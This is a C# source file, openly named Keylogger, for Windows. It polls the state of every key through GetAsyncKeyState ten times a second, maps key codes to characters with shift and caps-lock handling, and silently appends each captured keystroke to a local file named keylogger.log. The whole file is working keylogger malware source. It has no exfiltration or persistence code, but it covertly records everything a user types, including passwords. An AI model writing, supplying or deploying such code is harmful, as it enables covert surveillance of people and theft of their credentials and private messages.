using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Keylogger
{
    public class Keylogger
    {
        public static void GetKeys()
        {
            
            var buf = string.Empty;
            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int state = WinApi.GetAsyncKeyState(i);

                    if (state != (int)KeyState.Unpressed)
                    {
                        if (((Keys)i) == Keys.Space) { buf += " "; continue; }
                        if (((Keys)i) == Keys.Enter) { buf += Environment.NewLine; continue; }
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
                        if (((Keys)i) == Keys.Add) { buf += "+"; continue; }
                        if (((Keys)i) == Keys.Subtract) { buf += "-"; continue; }
                        if (((Keys)i) == Keys.Divide) { buf += "/"; continue; }
                        if (((Keys)i) == Keys.Multiply) { buf += "*"; continue; }
                        if (((Keys)i) == Keys.OemQuestion) { buf += "?"; continue; }
                        if (((Keys)i) == Keys.OemSemicolon) { buf += ";"; continue; }
                        if (((Keys)i) == Keys.Oemplus) { buf += "+"; continue; }
                        if (((Keys)i) == Keys.OemMinus) { buf += "-"; continue; }
                        if (((Keys)i) == Keys.Oemcomma) { buf += ","; continue; }
                        if (((Keys)i) == Keys.NumPad0) { buf += "0"; continue; }
                        if (((Keys)i) == Keys.NumPad1) { buf += "1"; continue; }
                        if (((Keys)i) == Keys.NumPad2) { buf += "2"; continue; }
                        if (((Keys)i) == Keys.NumPad3) { buf += "3"; continue; }
                        if (((Keys)i) == Keys.NumPad4) { buf += "4"; continue; }
                        if (((Keys)i) == Keys.NumPad5) { buf += "5"; continue; }
                        if (((Keys)i) == Keys.NumPad6) { buf += "6"; continue; }
                        if (((Keys)i) == Keys.NumPad7) { buf += "7"; continue; }
                        if (((Keys)i) == Keys.NumPad8) { buf += "8"; continue; }
                        if (((Keys)i) == Keys.NumPad9) { buf += "9"; continue; }
                        if (((Keys)i) == Keys.D1) { buf += "1"; continue; }
                        if (((Keys)i) == Keys.D2) { buf += "2"; continue; }
                        if (((Keys)i) == Keys.D3) { buf += "3"; continue; }
                        if (((Keys)i) == Keys.D4) { buf += "4"; continue; }
                        if (((Keys)i) == Keys.D5) { buf += "5"; continue; }
                        if (((Keys)i) == Keys.D6) { buf += "6"; continue; }
                        if (((Keys)i) == Keys.D7) { buf += "7"; continue; }
                        if (((Keys)i) == Keys.D8) { buf += "8"; continue; }
                        if (((Keys)i) == Keys.D9) { buf += "9"; continue; }

                        if (((Keys)i).ToString().Length == 1)
                        {
                            buf += IsBigSymbol() ? ((Keys)i).ToString().ToUpper() : ((Keys)i).ToString().ToLower();
                        }

                        File.AppendAllText("keylogger.log", buf);
                        buf = "";

                    }
                }
            }
        }



        static bool IsBigSymbol()
        {
            bool shift = false;
            var shiftNumber = 16;
            short shiftState = (short)WinApi.GetAsyncKeyState(shiftNumber);           
            if ((shiftState & 0x8000) == 0x8000)
            {
                shift = true;
            }
            var caps = Console.CapsLock;
            bool isBig = shift | caps;

            return isBig;
        }
    }

    public enum KeyState : int
    {
        Unpressed = 0
    }
}
